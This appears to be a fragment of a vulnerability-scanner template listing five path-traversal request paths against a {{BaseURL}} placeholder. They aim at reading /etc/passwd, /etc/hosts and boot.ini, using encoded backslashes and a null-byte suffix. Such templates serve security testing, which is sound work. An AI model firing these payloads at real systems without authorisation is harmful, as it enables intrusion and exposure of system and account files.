  - '{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd'
  - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
  - '{{BaseURL}}/../../../../../../../../../../../../etc/hosts%00'
  - '{{BaseURL}}/../../../../../../../../../../../../etc/hosts'
  - '{{BaseURL}}/../../boot.ini'
